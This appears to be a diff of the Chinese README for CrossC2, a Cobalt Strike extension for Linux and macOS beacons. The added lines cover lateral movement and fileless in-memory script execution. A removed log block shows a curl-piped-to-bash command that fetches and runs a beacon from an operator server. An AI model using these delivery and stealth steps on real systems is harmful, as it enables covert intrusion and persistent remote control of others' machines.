@@ -10,7 +10,9 @@
 
 🔥 自定义通信协议 [GO📖](https://gloxec.github.io/CrossC2/zh_cn/protocol/)
 
-🔥 现已支持横向移动 [GO📌](#横向移动: 使用方法)
+🔥 现已支持横向移动 [GO📌](#横向移动:-使用方法)
+
+🔥 现已支持从内存加载脚本 [GO📌](#内存中运行脚本)
 
 🎉 **Android** & **iPhone** 支持 [GO📌](#Mobile)
 
@@ -53,7 +55,7 @@
 | gen beacon (mips[el]) |  |  |  |  |  | ⍻ |
 
 受限说明:
-* CobaltStrike: 暂时仅支持3.14最后一个版本(bug fixs).
+* CobaltStrike: 暂时仅支持3.14最后一个版本(bug fixs), 以及4.x版本(详见cs4.1分支).
 * Linux: 特别老旧的系统可以选择cna中的"Linux-GLIBC"选项（2010年左右）
 * MacOS: 新系统仅支持64位程序
 * iOS: sandbox 
@@ -114,35 +116,26 @@
 
 可以更便捷的实现C2Profile配置及自定义通信协议TCP/UDP等等。 
 
-## 横向移动: 使用方法 [📖 Wiki]()
+## 横向移动
 
 1. 生成 `Linux-bind` / `MacOS-bind` 类型的beacon
 2. 内网中的目标运行 `./MacOS-bind.beacon <port>` 开启服务
 3. 在网络联通的session中运行 `connect <targetIP>:<port>`
 
+## 内存中运行脚本
 
-## cna插件方式
+可以直接在会话中调用主机中的 **bash** / **python** / **ruby** / **perl** / **php** 等脚本解释器执行传入内存中的脚本。
+`进程中不会存在任何信息，所有运行的内容皆从内存中传入解释器`
+1. python c:\getsysteminfo.py
+2. python import base64;print base64.b64encode('whoami'); print 'a'*40
+3. php <?php phpinfo()?>
 
-```
-菜单栏: CrossC2 -> CrossC2 Payload Generator -> genCrossC2
+尝试加载本地脚本:
+![](media/15901534124389/16041501958652.jpg)
 
-弹出的对话框中可以配置:
-1. 选择beacon_key(路径中不可以包含空格，该问题暂时未解决)
-2. 需要给beacon绑定的自定义通信协议动态库
-3. Payload类型(Staged生成的shellcode需要stagerServer)
-```
+尝试直接运行脚本语言:
+![](media/15901534124389/16041502298949.jpg)
 
-![](media/15901534124389/15901617930412.jpg)
-
-生成时信息状态会在event界面中提示
-
-```
-05/01 23:31:03 *** /mnt/cc2/genCrossC2.MacOS 172.16.251.1 5555 /tmp/beacon_keys null MacOS x64 /tmp/CrossC2-test
-05/01 23:31:06 *** genCrossC2 beacon -> *[success] :	Packed 1532232 byte.
-05/01 23:31:07 *** hook hosted CrossC2 beacon MacOS x64 @ http://172.16.251.1:55413/iqEBVKwHoZ
-05/01 23:31:07 *** hook hosted Script Unix Web Delivery (curl) @ http://172.16.251.1:55413/a
-05/01 23:31:07 *** CrossC2 MacOS x64:   curl -A o -o- -L http://172.16.251.1:55413/a | bash -s
-```
 
 
 # 即将上线
@@ -179,6 +172,11 @@
 ![](media/15854585486601/15854593957704.jpg)
 
 # ChangeLog
+
+## release v2.1 :
+
+* +支持 支持从内存中解析执行脚本
+* +支持 支持CobaltStrike 4.1 (详见cs4.1分支)
 
 ## release v2.0 :
 
